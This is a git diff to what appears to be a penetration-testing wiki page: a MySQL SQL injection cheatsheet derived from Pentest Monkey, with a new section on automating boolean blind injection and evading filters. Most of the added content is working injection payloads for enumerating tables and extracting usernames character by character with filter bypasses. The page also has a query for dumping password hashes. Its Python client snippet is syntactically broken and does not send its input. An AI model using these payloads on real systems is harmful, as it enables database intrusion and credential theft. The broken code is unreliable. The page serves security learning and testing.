@@ -1,4 +1,7 @@
-# MySQL SQL Injection Cheatsheet - Fixed From Pentest-Monkey
+# MySQL SQL Injection Cheatsheet
+
+This page is for SQL injection, for exploitation, misconfigurations and abuse of a MySQL database where you can access the database directly visit [[MySQL-Hacking]].  This page started as fixed version of Pentest Monkey cheatsheet that is old, but gold - it happen to use Unicode quotes so this is the *fixed* version. Other techniques, consideration and mitigation, etc will be added here over time.
+#### MySQL SQL Injection Cheatsheet - Fixed From Pentest-Monkey
 
 Fixed the Unicode single quotes for copy and paste -able. Pentest Monkey is Awesome.
 
@@ -29,7 +32,7 @@ List Password Hashes
 SELECT host, user, password FROM mysql.user; — priv
 ```
 
-Password Cracker 	John the Ripper will crack MySQL password hashes.
+Password Cracker John the Ripper will crack MySQL password hashes.
 
 List Privileges 	
 ```sql
@@ -171,7 +174,92 @@ information_schema (>= mysql 5.0)
 mysql
 ```
 
+#### IppSec's Automating Boolean SQL Injection and Evading Filters
+
+SQLi client
+```python
+import cmd
+import requests
+
+# IppSec's SQL Injection client
+# The benefits over BurpSuite being customisation of bad characters to URL encode
+# Source: https://www.youtube.com/watch?v=mF8Q1FhnU70
+
+# Use cmd to create a terminal
+class CMD(cmd.Cmd):
+        def __init__(self):
+                cmd.Cmd.__init__(self):
+                self.prompt = "sql> "
+
+        def default(self, line):
+                line = line.replace(" ", "%20")
+                r = requests.get(f"http://127.0.0.1:5000/path")
+                print.(r.text)
+
+cmd = Cmd()
+cmd.cmdloop()
+```
+
+Boolean injection 
+```sql
+' or (select 1) like 1-- -
+```
+False `{"result":0}` and True `{"result":1}` 
+```sql
+-- _ is a bad character; we also possibly cannot cast _ to hex
+' or (select schema_name from information_schema.schemata limit 1) like 1-- -
+```
+
+Enumerate the users column
+```sql
+' or (select 1 from users limit 1) like 1-- -
+```
+Validate with
+```sql
+' or (select 1 from users limit 1) like 2-- -
+```
+And
+```sql
+' or (select 1 from AAAAAARGH limit 1) like 2-- -
+```
+We `select 1` to guess one character at a time. Then fuzz one character at a time with [[FFUF-Cheatsheet]], [[WFUZZ]] and then the next column with `offset`
+```sql
+' or (select usernames from users limit 1 offset 0) like 'ippsec'-- -
+```
+Next we need to use `substring`. Beware confusing where it `substring()` starts, because `limit` starts with 0, but `substring()` start with 1. 
+```sql
+--(select substring(usernames,OFFSET,NUMBER_OF_CHARACTERS)
+-- substring start with 1 NOT 0
+' or (select substring(usernames,1,3) from users limit 1 offset 0) like 'ippsec'-- -
+```
+But commas are also bad characters so use the keyword `FROM` and `FOR`
+```sql
+--(select substring(usernames,OFFSET,NUMBER_OF_CHARACTERS)
+-- substring start with 1 NOT 0
+' or (select substring(usernames FROM 1 FOR 3) from users limit 1 offset 0) like 'ippsec'-- -
+```
+Ippsec likes working with decimal values as we can then use greater than and equal to an decimal value using MySQL's `ord()` to covert a string to decimal value
+```sql
+--(select substring(usernames,OFFSET,NUMBER_OF_CHARACTERS)
+-- substring start with 1 NOT 0 
+-- `man ascii` for list
+' or (select ord(substring(usernames FROM 1 FOR 3)) from users limit 1 offset 0) like 65-- -
+```
+But < > are bad characters... so we use the keyword `between` and `and`
+```sql
+--(select substring(usernames,OFFSET,NUMBER_OF_CHARACTERS)
+-- substring start with 1 NOT 0 
+-- `man ascii` for list
+' or (select ord(substring(usernames FROM 2 FOR 1)) from users limit 1 offset 0) between 113 and 200 -- -
+```
+Lengths of data with `length()`
+```sql
+' or (select length(usernames) from users limit 1 offset 0) like 1 -- -
+```
+
+22:45 - automate the extraction!
 
 ## References
 
 [Original Pentest Monkey Cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
+[IppSec Youtube - Automating Boolean SQL Injection and Evading Filters](https://www.youtube.com/watch?v=mF8Q1FhnU70)
